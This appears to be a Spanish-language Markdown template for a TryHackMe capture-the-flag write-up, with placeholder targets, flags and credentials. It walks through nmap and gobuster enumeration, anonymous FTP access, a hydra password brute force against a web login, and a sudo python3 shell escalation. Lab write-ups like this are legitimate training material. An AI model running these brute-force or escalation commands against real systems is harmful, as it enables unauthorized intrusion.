
# [Nombre de la Room] — TryHackMe

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat)
![Status](https://img.shields.io/badge/Status-Completed-blue?style=flat)

> **Fecha:** DD/MM/YYYY  
> **Autor:** [Josue Rendón](https://github.com/Slasho01)  
> **Room:** [link a la room](https://tryhackme.com/room/...)

---

## 📋 Descripción

Breve descripción de qué trata la room y qué se espera aprender. 2-3 líneas máximo.

> Ejemplo: Room de dificultad fácil enfocada en enumeración web y explotación de servicios FTP mal configurados.

---

## 🎯 Objetivos

- [ ] Flag de usuario
- [ ] Flag de root/admin
- [ ] (Agregar objetivos específicos de la room si tiene)

---

## 🔍 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sV -sC -p- <IP>
```

**Resultado:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```

**Puertos interesantes:**
- Puerto 21 — FTP (¿acceso anónimo?)
- Puerto 80 — HTTP (¿panel de login, directorio expuesto?)

---

## 🌐 2. Enumeración

### Web

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

**Directorios encontrados:**
```
/admin    (Status: 200)
/uploads  (Status: 403)
/login    (Status: 200)
```

### Servicio FTP (ejemplo)

```bash
ftp <IP>
# Usuario: anonymous
# Password: (vacío)
```

**Archivos encontrados:**
- `nota.txt` — contiene pista sobre usuario del sistema

---

## 💥 3. Explotación

### Vulnerabilidad encontrada

> Describir qué vulnerabilidad se encontró y por qué es explotable.
> Ejemplo: Login sin protección contra fuerza bruta + usuario encontrado vía FTP.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'
```

**Credenciales obtenidas:** `admin:password123`

### Acceso inicial

```bash
# Descripción del paso
ssh admin@<IP>
```

---

## 🚩 4. Flags

### Flag de usuario

```bash
cat /home/usuario/user.txt
```

```
THM{flag_de_usuario_aqui}
```

### Flag de root

```bash
cat /root/root.txt
```

```
THM{flag_de_root_aqui}
```

---

## ⬆️ 5. Escalada de privilegios

> Describir cómo se escaló de usuario normal a root.

```bash
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/python3
```

**Explotación:**
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

---

## 📝 6. Lecciones aprendidas

**¿Qué aprendí en esta room?**
- Punto 1 — ejemplo: cómo enumerar FTP con acceso anónimo
- Punto 2 — ejemplo: importancia de revisar archivos expuestos antes de explotar
- Punto 3 — ejemplo: escalada de privilegios con sudo y Python

**¿Qué haría diferente?**
- Ejemplo: automatizar la enumeración web con más extensiones desde el inicio

---

## 🔗 Referencias

- [Link a recurso relevante](https://ejemplo.com)
- [GTFOBins — escalada de privilegios](https://gtfobins.github.io/)
- [HackTricks](https://book.hacktricks.xyz/)

---

*Write-up por [Josue Rendón](https://github.com/Slasho01) · [TryHackMe Profile](https://tryhackme.com/)*
